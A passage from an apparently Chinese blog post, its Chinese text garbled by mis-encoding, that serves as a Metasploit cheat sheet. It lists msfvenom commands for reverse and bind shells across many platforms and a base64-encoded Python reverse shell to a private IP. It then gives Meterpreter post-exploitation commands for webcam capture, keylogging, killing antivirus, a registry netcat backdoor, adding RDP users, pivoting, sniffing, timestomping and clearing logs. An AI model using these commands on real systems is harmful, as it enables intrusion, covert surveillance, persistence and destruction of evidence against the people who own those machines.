href="#3-msfvenomç”Ÿæˆpayload-3" class="headerlink" title="3 msfvenomç”Ÿæˆpayload"></a>3 msfvenomç”Ÿæˆpayload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload(æ”»å‡»è·è½½)</span><br><span class="line">-l, --list       [module_type]   åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº,æ¨¡å—ç±»å‹åŒ…æ‹¬: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦</span><br><span class="line">-f, --format     &lt;format&gt;        æŒ‡å®šè¾“å‡ºæ ¼å¼ (ä½¿ç”¨ --help-formats æ¥è·å–msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨)</span><br><span class="line">-e, --encoder    [encoder]       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰</span><br><span class="line">-a, --arch       &lt;architecture&gt;  æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„</span><br><span class="line">    --platform   &lt;platform&gt;      æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°</span><br><span class="line">-s, --space      &lt;length&gt;        è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œæ¯”å¦‚: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°</span><br><span class="line">-c, --add-code   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶</span><br><span class="line">-x, --template   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span><br><span class="line">-k, --keep                       ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span><br><span class="line">    --payload-options            åˆ—ä¸¾payloadçš„æ ‡å‡†é€‰é¡¹</span><br><span class="line">-o, --out   &lt;path&gt;               ä¿å­˜payload</span><br><span class="line">-v, --var-name &lt;name&gt;            æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼</span><br><span class="line">    --shellest                   æœ€å°åŒ–ç”Ÿæˆpayload</span><br><span class="line">-h, --help                       æŸ¥çœ‹å¸®åŠ©é€‰é¡¹</span><br><span class="line">    --help-formats               æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨</span><br></pre></td></tr></table></figure>1.å¯æ‰§è¡Œç¨‹åºLinux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šç›´æ¥å¤åˆ¶å¯æ‰§è¡Œç¨‹åºåˆ°ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå°±è¡Œäº†ã€‚2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå°†shell.phpæ”¾åœ¨webç›®å½•ä¸‹ï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.è„šæœ¬shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå¤åˆ¶shell.pyä¸­çš„å†…å®¹åœ¨linuxå‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-MeterpreteråŸºæœ¬å‘½ä»¤-3"><a href="#4-MeterpreteråŸºæœ¬å‘½ä»¤-3" class="headerlink" title="4. MeterpreteråŸºæœ¬å‘½ä»¤"></a>4. MeterpreteråŸºæœ¬å‘½ä»¤</h2>é¦–å…ˆéœ€è¦å…ˆè·å–meterpreterï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ”»å‡»ï¼Œåå°) -z(æ”»å‡»å®Œæˆä¸é‡ä¼šè¯äº¤äº’)</span><br><span class="line">jobs  # æŸ¥çœ‹åå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">kill &lt;id&gt;  # åœæ­¢æŸåå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">sessions -l  # (æŸ¥çœ‹ä¼šè¯)</span><br><span class="line">sessions -i 2   # é€‰æ‹©ä¼šè¯</span><br><span class="line">sessions -k 2   # ç»“æŸä¼šè¯</span><br></pre></td></tr></table></figure>å¦‚æœå…ˆè·å–äº†cmdï¼Œæ¯”å¦‚åˆ©ç”¨ms17-010ï¼Œé»˜è®¤ä½¿ç”¨çš„payloadè¿”å›çš„å°±æ˜¯cmdã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>sessions-u 2</code>æ¥å°†cmdshellå‡çº§æˆmeterpreterã€‚è·å–åˆ°äº†meterpreterï¼Œå°±å¯ä»¥è¿›è¡Œåæ¸—é€äº†ã€‚<h3 id="4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-3"><a href="#4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-3" class="headerlink" title="4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"></a>4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># ä¼šè¯ç®¡ç†</span><br><span class="line">background  #å°†å½“å‰ä¼šè¯æ”¾ç½®åå°</span><br><span class="line">sessions  # æŸ¥çœ‹ä¼šè¯</span><br><span class="line">sessions -i  # åˆ‡æ¢ä¼šè¯</span><br><span class="line">quit  # å…³é—­å½“å‰çš„ä¼šè¯ï¼Œè¿”å›msfç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># ç³»ç»Ÿè®¾ç½®</span><br><span class="line">sysinfo  # æŸ¥çœ‹ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯</span><br><span class="line">idletime  # æŸ¥çœ‹ç›®æ ‡æœºé—²ç½®æ—¶é—´</span><br><span class="line">reboot/shutdown   # é‡å¯/å…³æœº</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # è·å¾—æ§åˆ¶å°æƒé™</span><br><span class="line">irb  # è¿›å…¥rubyç»ˆç«¯</span><br><span class="line"></span><br><span class="line"># è¿›ç¨‹è¿ç§»</span><br><span class="line">getpid    # è·å–å½“å‰è¿›ç¨‹çš„pid</span><br><span class="line">ps   # æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line">kill &lt;pidå€¼&gt;   #æ€æ­»è¿›ç¨‹</span><br><span class="line">migrate &lt;pidå€¼&gt;    #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute #åœ¨ç›®æ ‡æœºä¸­æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">execute -H -i -f cmd.exe # åˆ›å»ºæ–°è¿›ç¨‹cmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’</span><br><span class="line"></span><br><span class="line"># æ‘„åƒå¤´å‘½ä»¤</span><br><span class="line">webcam_list  #æŸ¥çœ‹æ‘„åƒå¤´åˆ—è¡¨</span><br><span class="line">webcam_chat  # æŸ¥çœ‹æ‘„åƒå¤´æ¥å£</span><br><span class="line">webcam_snap   #é€šè¿‡æ‘„åƒå¤´æ‹ç…§</span><br><span class="line">webcam_stream   #é€šè¿‡æ‘„åƒå¤´å¼€å¯è§†é¢‘</span><br><span class="line"></span><br><span class="line"># uictlå¼€å…³é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl disable mouse  #ç¦ç”¨é¼ æ ‡</span><br><span class="line">uictl disable keyboard  #ç¦ç”¨é”®ç›˜</span><br><span class="line"></span><br><span class="line"># è¿œç¨‹æ¡Œé¢/æˆªå±</span><br><span class="line">enumdesktops  #æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢</span><br><span class="line">getdesktop    #è·å–å½“å‰meterpreter å…³è”çš„æ¡Œé¢</span><br><span class="line">screenshot  #æˆªå±</span><br><span class="line">use espia  #æˆ–è€…ä½¿ç”¨espiaæ¨¡å—æˆªå±  ç„¶åè¾“å…¥screengrab</span><br><span class="line">run vnc  #ä½¿ç”¨vncè¿œç¨‹æ¡Œé¢è¿æ¥</span><br><span class="line"></span><br><span class="line"># é”®ç›˜è®°å½•</span><br><span class="line">keyscan_start  #å¼€å§‹é”®ç›˜è®°å½•</span><br><span class="line">keyscan_dump   #å¯¼å‡ºè®°å½•æ•°æ®</span><br><span class="line">keyscan_stop #ç»“æŸé”®ç›˜è®°å½•</span><br><span class="line"></span><br><span class="line"># æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line"># å¼€å¯rdpæ˜¯é€šè¿‡regä¿®æ”¹æ³¨å†Œè¡¨ï¼›æ·»åŠ ç”¨æˆ·æ˜¯è°ƒç”¨cmd.exe é€šè¿‡net useræ·»åŠ ï¼›ç«¯å£è½¬å‘æ˜¯åˆ©ç”¨çš„portfwdå‘½ä»¤</span><br><span class="line">run post/windows/manage/enable_rdp  #å¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #æ·»åŠ ç”¨æˆ·</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #å°†3389ç«¯å£è½¬å‘åˆ°6662</span><br><span class="line"></span><br><span class="line"># å…³é—­é˜²ç—…æ¯’è½¯ä»¶</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹æ³¨å†Œè¡¨</span><br><span class="line">reg â€“h # æ³¨å†Œè¡¨å‘½ä»¤å¸®åŠ©</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #ä¸Šä¼ nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #æšä¸¾runä¸‹çš„key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #è®¾ç½®é”®å€¼</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #æŸ¥çœ‹é”®å€¼</span><br><span class="line">nc -v 192.168.81.162 443  #æ”»å‡»è€…è¿æ¥ncåé—¨</span><br><span class="line"></span><br><span class="line"># æ¸…ç†æ—¥å¿—</span><br><span class="line">clearav  #æ¸…é™¤windowsä¸­çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure><h3 id="4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-3"><a href="#4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-3" class="headerlink" title="4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"></a>4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # åŸºæœ¬å‘½ä»¤</span><br><span class="line">search -f *pass* -d C:\\windows # æœç´¢æ–‡ä»¶  -hæŸ¥çœ‹å¸®åŠ©</span><br><span class="line">getwd/pwd  # è·å–å½“å‰ç›®å½•</span><br><span class="line">getlwd/lpwd   # æ“ä½œæ”»å‡»è€…ä¸»æœº æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # ä¸‹è½½æ–‡ä»¶</span><br><span class="line">edit c:\\1.txt  # ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶  æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶</span><br><span class="line">mkdir lltest2  # åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹</span><br><span class="line">rmdir lltest2  # åªèƒ½åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤¹</span><br><span class="line">lcd /tmp   # æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•</span><br><span class="line"></span><br><span class="line"># timestompä¼ªé€ æ–‡ä»¶æ—¶é—´æˆ³</span><br><span class="line">timestomp C:// -h   #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">timestomp -v C://2.txt   #æŸ¥çœ‹æ—¶é—´æˆ³</span><br><span class="line">timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-ç½‘ç»œå‘½ä»¤-3"><a href="#4-3-ç½‘ç»œå‘½ä»¤-3" class="headerlink" title="4.3 ç½‘ç»œå‘½ä»¤"></a>4.3 ç½‘ç»œå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># åŸºæœ¬</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat â€“ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #æŸ¥çœ‹ä»£ç†ä¿¡æ¯</span><br><span class="line">route   #æŸ¥çœ‹è·¯ç”±</span><br><span class="line"></span><br><span class="line"># portfwdç«¯å£è½¬å‘</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #ç„¶åä½¿ç”¨rdesktopæ¥è¿æ¥ï¼Œ-u ç”¨æˆ·å -p å¯†ç </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ·»åŠ è·¯ç”±</span><br><span class="line"></span><br><span class="line"># æ–¹å¼ä¸€autoroute ï¼ˆdeprecatedï¼‰</span><br><span class="line">run autoroute â€“h #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run autoroute -s 192.168.2.0/24  #æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run autoroute â€“p  #æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line"># æ–¹å¼äºŒpost/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #è‡ªåŠ¨æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run post/multi/manage/autoroute CMD=print # æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># ç„¶åå¯ä»¥åˆ©ç”¨arp_scannerã€portscanç­‰è¿›è¡Œæ‰«æ</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autorouteæ·»åŠ å®Œè·¯ç”±åï¼Œè¿˜å¯ä»¥åˆ©ç”¨msfè‡ªå¸¦çš„æ¨¡å—è¿›è¡Œsocksä»£ç†</span><br><span class="line"># msfæä¾›äº†2ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># å…ˆbackgroundé€€å‡ºæ¥ï¼Œç„¶åï¼š</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># ç„¶åvi /etc/proxychains.conf #æ·»åŠ  socks5 127.0.0.1 1080</span><br><span class="line"># æœ€åproxychains ä½¿ç”¨Socks5ä»£ç†è®¿é—®</span><br><span class="line"></span><br><span class="line"># snifferæŠ“åŒ…</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #æŸ¥çœ‹ç½‘å¡</span><br><span class="line">sniffer_start 2   #é€‰æ‹©ç½‘å¡ å¼€å§‹æŠ“åŒ…</span><br><span class="line">sniffer_stats 2   #æŸ¥çœ‹çŠ¶æ€</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #å¯¼å‡ºpcapæ•°æ®åŒ…</span><br><span class="line">sniffer_stop 2   #åœæ­¢æŠ“åŒ…</span><br></pre></td></tr></table></figure><h3 id="4-4-ä¿¡æ¯æ”¶é›†-3"><a href="#4-4-ä¿¡æ¯æ”¶é›†-3" class="headerlink" title="4.4 ä¿¡æ¯æ”¶é›†"></a>4.4 ä¿¡æ¯æ”¶é›†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ä¿¡æ¯æ”¶é›†çš„è„šæœ¬ä½äºï¼š</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># ä»¥ä¸‹åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„</span><br><span class="line">run post/windows/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/linux/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/windows/gather/forensics/enum_drives #æŸ¥çœ‹åˆ†åŒº</span><br><span class="line">run post/windows/gather/enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯</span><br><span class="line">run post/windows/gather/dumplinks   #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œ</span><br><span class="line">run post/windows/gather/enum_ie  #è·å–IEç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_chrome   #è·å–Chromeç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_patches  #è¡¥ä¸ä¿¡æ¯</span><br><span class="line">run post/windows/gather/enum_domain  #æŸ¥æ‰¾åŸŸæ§</span><br></pre></td></tr></table></figure><h3 id="4-5-ææƒ-3"><a href="#4-5-ææƒ-3" class="headerlink" title="4.5 ææƒ"></a>4.5 ææƒ</h3>1.getsystemææƒ<br>getsystemå·¥ä½œåŸç†ï¼š<br>â‘ 